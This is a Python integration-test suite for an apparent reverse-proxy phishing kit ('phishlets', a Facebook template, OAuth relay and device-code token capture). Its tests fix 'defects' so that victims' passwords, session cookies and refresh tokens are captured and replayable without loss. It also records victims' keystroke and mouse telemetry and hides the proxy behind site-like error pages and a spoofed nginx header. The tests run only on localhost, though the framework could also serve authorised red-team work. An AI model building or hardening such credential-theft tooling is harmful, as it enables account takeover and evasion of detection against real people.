"""Delivery-layer hardening tests - real sockets, real upstream, real store.

Every test here exercises the REAL path: a genuine localhost listener (a raw socket
pair or a real HTTP upstream on 127.0.0.1) and, where a token set is involved, a real
``CaptureDB`` round-trip. Nothing injects a fake transport, because a fake transport is
exactly what let the defects below ship green.

Each test names the defect it pins. Run:

    ./.venv/bin/python -m pytest tests/test_delivery_hardening.py -q -p no:cacheprovider
"""
import base64
import http.server
import json
import os
import socket
import socketserver
import sys
import tempfile
import threading
import time
import urllib.parse

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import (  # noqa: E402
    capture,
    chains,
    dbsc,
    keepalive,
    proxy,
    server,
    session,
    tokenintel,
    transport,
)

pytestmark = pytest.mark.integration

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SITE = os.path.join(HERE, "templates", "01_facebook")

LOGIN_HTML = (b"<!doctype html><html><head><title>Sign in</title></head><body>"
              b"<form action=\"/login\" method=\"post\"><input name=\"email\">"
              b"<input name=\"password\" type=\"password\"></form></body></html>")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def raw_http(port, payload, wait=0.4, timeout=3.0):
    """Send raw bytes to a real localhost listener and read everything it answers."""
    conn = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    try:
        conn.sendall(payload)
        time.sleep(wait)
        conn.settimeout(timeout)
        data = b""
        while True:
            try:
                chunk = conn.recv(65536)
            except TimeoutError:
                break
            if not chunk:
                break
            data += chunk
    finally:
        conn.close()
    return data


def responses(data):
    """How many HTTP responses are in this byte stream (a desync shows as two)."""
    return data.count(b"HTTP/1.1 ")


def jwt(payload):
    def seg(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")
    return seg({"alg": "RS256"}) + "." + seg(payload) + ".sig"


ACCESS = jwt({"aud": "graph", "scp": "Mail.Read", "exp": time.time() + 3600})


class _UpstreamHandler(http.server.BaseHTTPRequestHandler):
    """A real target site: login page, credential POST, 500, and an OAuth token route."""

    def log_message(self, *a):
        pass

    def _send(self, body, status=200, ct="text/html; charset=utf-8", cookies=()):
        self.send_response(status)
        self.send_header("Content-Type", ct)
        for c in cookies:
            self.send_header("Set-Cookie", c)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/boom":
            self._send(b"nope", status=500)
        elif path == "/token":
            self._send(b"{}", ct="application/json")
        else:
            self._send(LOGIN_HTML)

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        n = int(self.headers.get("Content-Length") or 0)
        self.rfile.read(n)
        if path == "/token":
            self._send(json.dumps({"access_token": ACCESS, "refresh_token": "RT-1",
                                   "scope": "Mail.Read offline_access",
                                   "expires_in": 3600}).encode(), ct="application/json")
        elif path == "/login":
            self.send_response(302)
            self.send_header("Location", "/dashboard")
            self.send_header("Set-Cookie", "auth=tok_1; Path=/")
            self.send_header("Content-Length", "0")
            self.end_headers()
        else:
            self._send(b"ok")


class Upstream:
    """Context manager for a real upstream HTTP server on 127.0.0.1."""

    def __enter__(self):
        self.port = free_port()
        self.httpd = socketserver.ThreadingTCPServer(("127.0.0.1", self.port),
                                                     _UpstreamHandler)
        self.httpd.daemon_threads = True
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.15)
        return self

    def __exit__(self, *exc):
        self.httpd.shutdown()
        self.httpd.server_close()
        return False

    @property
    def host(self):
        return f"127.0.0.1:{self.port}"


class LiveProxy:
    """The proxy engine in front of a real upstream, listening on 127.0.0.1."""

    def __init__(self, upstream_host, db=None, oauth=None, **phishlet_kwargs):
        kwargs = {"name": "acme", "upstream": upstream_host, "scheme": "http",
                  "capture_cookies": ("*",), "inject_paths": (".*",),
                  "rewrite_hosts": [upstream_host], "verify_tls": False}
        if oauth is not None:
            kwargs["oauth"] = oauth
        kwargs.update(phishlet_kwargs)
        self.phishlet = proxy.Phishlet(**kwargs)
        self.engine = proxy.ProxyEngine(self.phishlet, db=db, logger=lambda *a: None)
        self.port = free_port()
        self.httpd = proxy.serve_proxy(self.engine, self.port, host="127.0.0.1",
                                       campaign="dh-test")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.15)

    def stop(self):
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture()
def db():
    d = tempfile.mkdtemp(prefix="bh_dh_")
    store = capture.CaptureDB(os.path.join(d, "dh.db"))
    yield store
    store.close()


# ============================================== token set -> every consumer ========
class TestTokenSetReachesConsumers:
    """DEFECT (P0): add_oauth stored the token set only in rec["oauth"], but tokenintel,
    tier0, dbsc, the chain pre-flight and the CLI all read rec["tokens"] - so a refresh
    token captured by the OAuth relay or a device-code grant was invisible to the token
    tier. The fix mirrors the set into rec["tokens"] and annotates it on save."""

    def test_oauth_relay_token_set_lands_in_tokens_and_is_annotated(self, db):
        with Upstream() as up:
            spec = {"provider": "custom", "client_id": "cid",
                    "issuer": f"http://{up.host}", "token_path": "/token",
                    "authorize_path": "/authorize", "scope": "Mail.Read"}
            p = LiveProxy(up.host, db=db, oauth=spec)
            try:
                sess = p.engine.session(None, ip="1.2.3.4")
                auth = p.engine.oauth_start(sess)
                state = urllib.parse.parse_qs(
                    urllib.parse.urlparse(auth).query)["state"][0]
                # the provider redirects the victim's browser back to our callback
                data = raw_http(p.port,
                                (f"GET /__bh/oauth/cb?code=xyz&state={state} "
                                 f"HTTP/1.1\r\nHost: proxy.test\r\n"
                                 f"Cookie: __bhs={sess.sid}\r\nConnection: close\r\n\r\n")
                                .encode())
                assert b"302" in data.split(b"\r\n", 1)[0], data[:200]
                time.sleep(0.2)

                rec = db.session_get(sess.sid)
                # 1) the token set landed where every consumer reads it
                assert rec["tokens"].get("refresh_token") == "RT-1", rec.get("tokens")
                assert rec["tokens"].get("access_token") == ACCESS
                assert rec["tokens"].get("scope") == "Mail.Read offline_access"
                # 2) the capture path annotated it exactly once, with a real verdict
                intel = rec["token_intel"]
                assert intel["replayability"] == "replayable", intel
                assert "replayable" in tokenintel.line(rec)
                # 3) the chain pre-flight sees the same verdict
                assert chains._token_tier(rec)["verdict"] == "replayable"
                # 4) the reads the CLI's --token-keepalive / --replayability perform
                assert dbsc.replayability(rec["tokens"])["verdict"] == "replayable"
                rt = rec["tokens"]["refresh_token"]
                assert rt and keepalive.KeepAlive(rt, client_id="cid",
                                                  tenant="common") is not None
            finally:
                p.stop()

    def test_add_oauth_populates_tokens_without_a_store(self):
        """The mirror happens in add_oauth itself, so it holds for the device-code path
        (which calls add_oauth directly) as well as the proxy callback."""
        rec = session.new_record("dc-1", phishlet="devicecode:custom")
        assert session.add_oauth(rec, {"access_token": ACCESS, "refresh_token": "RT-1",
                                       "scope": "Mail.Read", "expires_in": 3600},
                                 provider="custom", client_id="cid",
                                 source="devicecode") == 1
        assert rec["tokens"]["refresh_token"] == "RT-1"
        assert rec["tokens"]["access_token"] == ACCESS
        assert tokenintel.annotate(rec)["replayability"] == "replayable"

    def test_a_later_cookie_harvest_does_not_wipe_the_oauth_set(self):
        """DEFECT: note_tokens did `rec["tokens"] = dict(sess.tokens)`, replacing the
        whole map - a cookie/header harvest after an OAuth capture wiped the refresh
        token. It now merges."""
        phishlet = proxy.Phishlet(name="acme", upstream="acme.test", scheme="https",
                                  auth_tokens=[{"keys": ["auth"]}])
        engine = proxy.ProxyEngine(phishlet, db=None, logger=lambda *a: None)
        sess = engine.session(None, ip="1.2.3.4")
        session.add_oauth(sess.vault, {"access_token": ACCESS, "refresh_token": "RT-1"},
                          provider="custom", client_id="cid", source="oauth")
        resp = transport.Response(200, {"Content-Type": "text/html", "Set-Cookie": "auth=x"},
                                  b"", pairs=[("Content-Type", "text/html"),
                                              ("Set-Cookie", "auth=x")])
        engine.note_tokens(sess, resp, path="/", host=None)
        assert sess.vault["tokens"]["auth"] is True
        assert sess.vault["tokens"]["refresh_token"] == "RT-1", sess.vault["tokens"]


# ============================================== oauth callback robustness ==========
class TestOAuthCallback:
    def test_unsolicited_callback_is_handled_not_a_crash(self):
        """DEFECT: a callback with no live flow returned None and _oauth_callback then
        dereferenced it (AttributeError), killing the request thread. It must show the
        recovery page and keep serving."""
        with Upstream() as up:
            spec = {"provider": "custom", "client_id": "cid",
                    "issuer": f"http://{up.host}", "token_path": "/token"}
            p = LiveProxy(up.host, oauth=spec)
            try:
                data = raw_http(p.port, b"GET /__bh/oauth/cb?code=abc&state=deadbeef "
                                        b"HTTP/1.1\r\nHost: proxy.test\r\n"
                                        b"Connection: close\r\n\r\n")
                assert data.split(b"\r\n", 1)[0].endswith(b"200 OK"), data[:200]
                assert b"could not be completed" in data
                # the listener survived the bad callback and still answers (with the
                # oauth relay configured, a page navigation is a 302 to the provider)
                again = raw_http(p.port, b"GET /login HTTP/1.1\r\nHost: proxy.test\r\n"
                                         b"Connection: close\r\n\r\n")
                assert responses(again) == 1, again
                assert again.split(b"\r\n", 1)[0].startswith(b"HTTP/1.1 302")
            finally:
                p.stop()


# ============================================== HTTP framing (proxy) ==============
class TestProxyFraming:
    """DEFECT: every framing refusal left the request body unread on a keep-alive
    connection, so the leftover bytes were parsed as the next request line (measured:
    the form body read back as a method name). A rejection now closes the connection."""

    def test_oversized_content_length_is_rejected_without_desync(self):
        with Upstream() as up:
            p = LiveProxy(up.host)
            try:
                payload = (b"POST /login HTTP/1.1\r\nHost: proxy.test\r\n"
                           b"Content-Type: application/x-www-form-urlencoded\r\n"
                           b"Content-Length: " + str(5 * 1024 * 1024).encode() + b"\r\n\r\n")
                payload += b"email=a@b.test&password=pw"
                payload += b"GET /health HTTP/1.1\r\nHost: proxy.test\r\n\r\n"
                data = raw_http(p.port, payload)
                assert responses(data) == 1, data
                assert b"413" in data.split(b"\r\n", 1)[0]
            finally:
                p.stop()

    def test_negative_content_length_is_rejected_not_silently_empty(self):
        with Upstream() as up:
            p = LiveProxy(up.host)
            try:
                payload = (b"POST /login HTTP/1.1\r\nHost: proxy.test\r\n"
                           b"Content-Length: -1\r\n\r\n")
                payload += b"email=a@b.test&password=pw"
                payload += b"GET /health HTTP/1.1\r\nHost: proxy.test\r\n\r\n"
                data = raw_http(p.port, payload)
                assert responses(data) == 1, data
                assert b"400" in data.split(b"\r\n", 1)[0]
            finally:
                p.stop()

    def test_duplicate_content_length_is_rejected(self):
        with Upstream() as up:
            p = LiveProxy(up.host)
            try:
                payload = (b"POST /login HTTP/1.1\r\nHost: proxy.test\r\n"
                           b"Content-Length: 5\r\nContent-Length: 7\r\n\r\nemail=abc")
                payload += b"GET /health HTTP/1.1\r\nHost: proxy.test\r\n\r\n"
                data = raw_http(p.port, payload)
                assert responses(data) == 1, data
                assert b"400" in data.split(b"\r\n", 1)[0]
            finally:
                p.stop()

    def test_unsupported_transfer_encoding_is_not_silently_dropped(self):
        """DEFECT: a transfer coding we cannot decode (gzip) was accepted, the body was
        dropped and the login POST relayed empty - credentials lost."""
        with Upstream() as up:
            p = LiveProxy(up.host)
            try:
                payload = (b"POST /login HTTP/1.1\r\nHost: proxy.test\r\n"
                           b"Transfer-Encoding: gzip\r\n"
                           b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                           b"email=a@b.test&password=pw")
                data = raw_http(p.port, payload)
                assert responses(data) == 1, data
                assert b"501" in data.split(b"\r\n", 1)[0]
            finally:
                p.stop()

    def test_chunked_body_still_reaches_the_upstream(self):
        with Upstream() as up:
            p = LiveProxy(up.host)
            try:
                payload = (b"POST /login HTTP/1.1\r\nHost: proxy.test\r\n"
                           b"Transfer-Encoding: chunked\r\n"
                           b"Content-Type: application/x-www-form-urlencoded\r\n"
                           b"Connection: close\r\n\r\n"
                           b"10\r\nemail=a@b.test&p\r\nb\r\nassword=pw\r\n0\r\n\r\n")
                data = raw_http(p.port, payload)
                assert data.split(b"\r\n", 1)[0].endswith(b"302 Found"), data[:200]
            finally:
                p.stop()


# ============================================== HTTP framing (static server) ======
class TestStaticServerFraming:
    """The static server has the same defect and, additionally, no chunked support at
    all - so it must refuse a Transfer-Encoding instead of reading the body as empty."""

    @pytest.fixture()
    def live(self, tmp_path):
        port = free_port()
        httpd, _ = server.serve(os.path.join(HERE, "templates"), SITE, port,
                                os.path.join(str(tmp_path), "s.db"),
                                geo_provider="off", server_header="nginx")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.15)
        yield port
        httpd.shutdown()
        httpd.server_close()

    def test_oversized_content_length_is_rejected_without_desync(self, live):
        payload = (b"POST /login HTTP/1.1\r\nHost: x.test\r\n"
                   b"Content-Type: application/x-www-form-urlencoded\r\n"
                   b"Content-Length: " + str(5 * 1024 * 1024).encode() + b"\r\n\r\n")
        payload += b"email=a@b.test&password=pw"
        payload += b"GET /health HTTP/1.1\r\nHost: x.test\r\n\r\n"
        data = raw_http(live, payload)
        assert responses(data) == 1, data
        assert b"413" in data.split(b"\r\n", 1)[0]

    def test_negative_content_length_is_rejected(self, live):
        payload = (b"POST /login HTTP/1.1\r\nHost: x.test\r\nContent-Length: -1\r\n\r\n")
        payload += b"email=a@b.test&password=pw"
        payload += b"GET /health HTTP/1.1\r\nHost: x.test\r\n\r\n"
        data = raw_http(live, payload)
        assert responses(data) == 1, data
        assert b"400" in data.split(b"\r\n", 1)[0]

    def test_transfer_encoding_is_refused(self, live):
        payload = (b"POST /login HTTP/1.1\r\nHost: x.test\r\n"
                   b"Transfer-Encoding: chunked\r\n\r\n"
                   b"10\r\nemail=a@b.test&p\r\n0\r\n\r\n")
        data = raw_http(live, payload)
        assert responses(data) == 1, data
        assert b"501" in data.split(b"\r\n", 1)[0]


# ============================================== capture store hardening ============
class TestCaptureStoreHardening:
    def test_connection_registry_stays_bounded_across_request_threads(self, db):
        """DEFECT: the store kept one sqlite connection per request thread forever
        (measured: 1 -> 151 after 150 short-lived threads). It is now reaped."""
        def worker(i):
            db.log_visit(f"10.0.0.{i}", "UA")
            db.session_save({"sid": f"s{i}", "created": time.time(),
                             "updated": time.time(), "credentials": {"a": "b"},
                             "cookies": [], "tokens": {}, "takeovers": [],
                             "state": "creds"})

        for i in range(120):
            t = threading.Thread(target=worker, args=(i,))
            t.start()
            t.join()
        # bounded to (roughly) the live threads, not one per thread ever created
        assert len(db._conns) < 16, len(db._conns)
        # and the store still works after all that reaping
        assert db.stats()["total_captures"] == 0
        assert db.session_stats()["sessions"] == 120

    def test_a_failed_export_does_not_truncate_the_previous_one(self, db, tmp_path,
                                                               monkeypatch):
        """DEFECT: export_json wrote straight to the destination, so a failure wiped the
        operator's previous export to zero bytes. It now writes a temp file + replace."""
        db.record("/x", "1.2.3.4", "", "", "", "UA", "pc", {"email": "a"}, True)
        dest = os.path.join(str(tmp_path), "export.json")
        with open(dest, "w", encoding="utf-8") as f:
            f.write('{"PRE": true}')

        def boom(*a, **k):
            raise OSError("disk full")

        monkeypatch.setattr(json, "dump", boom)
        with pytest.raises(OSError):
            db.export_json(dest)
        with open(dest, encoding="utf-8") as f:
            assert f.read() == '{"PRE": true}'          # untouched
        leftovers = [n for n in os.listdir(str(tmp_path)) if ".tmp-" in n]
        assert leftovers == [], leftovers                # and no temp litter

    def test_session_row_does_not_write_the_dead_columns(self, db):
        """DEFECT: sessions.tokens_json / timeline_json were written on every save but no
        query ever read them (record_json is the read path)."""
        rec = session.new_record("sid-dead", phishlet="acme")
        rec["tokens"] = {"refresh_token": "RT-1"}
        rec["credentials"] = {"email": "a@b.test", "password": "x"}
        db.session_save(rec)
        row = db.conn.execute(
            "SELECT tokens_json, timeline_json FROM sessions WHERE sid=?",
            ("sid-dead",)).fetchone()
        assert row == (None, None), row
        # the data is still fully recoverable from record_json
        assert db.session_get("sid-dead")["tokens"]["refresh_token"] == "RT-1"


# ============================================== token fingerprint / caching ========
class TestTokenFingerprint:
    def test_values_that_differ_past_char_64_do_not_collide(self):
        """DEFECT: the fingerprint truncated each value to 64 chars, so re-issued tokens
        that share a prefix (routine for JWTs) collided and the stale verdict was reused."""
        a = {"access_token": "H" * 64 + "AAAA", "refresh_token": "RT-1"}
        b = {"access_token": "H" * 64 + "BBBB", "refresh_token": "RT-1"}
        assert tokenintel._fingerprint(a) != tokenintel._fingerprint(b)

    def test_a_changed_token_gets_a_fresh_verdict(self):
        rec = session.new_record("sid-fp")
        rec["tokens"] = {"access_token": "H" * 64 + "AAAA", "refresh_token": "RT-1"}
        first = tokenintel.annotate(rec)
        rec["tokens"]["access_token"] = "H" * 64 + "BBBB"
        second = tokenintel.annotate(rec)
        assert first["at"] != second["at"], "the cached verdict was reused for new tokens"


# ============================================== recording persistence =============
class TestRecordingPersistence:
    def test_hook_telemetry_survives_in_the_stored_record(self, db):
        """DEFECT: the recording was collected and capped but only len() was reported -
        the telemetry never left the process. A bounded tail now rides in the vault."""
        with Upstream() as up:
            p = LiveProxy(up.host, db=db)
            try:
                sess = p.engine.session(None, ip="1.2.3.4")
                events = [{"t": 1, "type": "input", "name": "password", "len": 1},
                          {"t": 2, "type": "mm", "x": 10, "y": 20}]
                payload = json.dumps({"sid": sess.sid,
                                      "fields": {"email": "a@b.test", "password": "pw"},
                                      "fingerprint": {"ua": "Mozilla/5.0"},
                                      "events": events}).encode()
                raw_http(p.port, (b"POST /__bh/capture HTTP/1.1\r\nHost: proxy.test\r\n"
                                  b"Content-Type: application/json\r\n"
                                  b"Content-Length: " + str(len(payload)).encode()
                                  + b"\r\nConnection: close\r\n\r\n" + payload))
                time.sleep(0.2)
                rec = db.session_get(sess.sid)
                assert rec["recording"] == events, rec.get("recording")
            finally:
                p.stop()


# ============================================== upstream failure modes ============
class TestUpstreamFailure:
    def test_upstream_500_passes_through(self, db):
        with Upstream() as up:
            p = LiveProxy(up.host, db=db)
            try:
                data = raw_http(p.port, b"GET /boom HTTP/1.1\r\nHost: proxy.test\r\n"
                                        b"Connection: close\r\n\r\n")
                assert data.split(b"\r\n", 1)[0].endswith(b"500 Internal Server Error")
            finally:
                p.stop()

    def test_dead_upstream_returns_a_site_like_502(self, db):
        dead = f"127.0.0.1:{free_port()}"               # nothing listening
        p = LiveProxy(dead, db=db)
        try:
            data = raw_http(p.port, b"GET /login HTTP/1.1\r\nHost: proxy.test\r\n"
                                    b"Connection: close\r\n\r\n")
            assert data.split(b"\r\n", 1)[0].endswith(b"502 Bad Gateway")
            assert b"temporarily unavailable" in data
            assert b"proxy" not in data.lower()
        finally:
            p.stop()
